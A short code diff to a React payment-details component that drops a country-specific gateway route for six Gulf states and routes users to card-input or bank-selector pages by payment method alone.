@@ -64,17 +64,12 @@ const PaymentDetails = () => {
   const formattedAmount = formatCurrency(amount, countryCode);
   
   const handleProceed = () => {
-    // Check if link has country code for dynamic gateway
-    if (countryCode && ['SA', 'AE', 'KW', 'QA', 'OM', 'BH'].includes(countryCode.toUpperCase())) {
-      navigate(`/pay/${id}/gateway`);
+    const paymentMethod = shippingInfo?.payment_method || 'card';
+    
+    if (paymentMethod === 'card') {
+      navigate(`/pay/${id}/card-input`);
     } else {
-      // Fallback to old flow
-      const paymentMethod = shippingInfo?.payment_method || 'card';
-      if (paymentMethod === 'card') {
-        navigate(`/pay/${id}/card-input`);
-      } else {
-        navigate(`/pay/${id}/bank-selector`);
-      }
+      navigate(`/pay/${id}/bank-selector`);
     }
   };
   
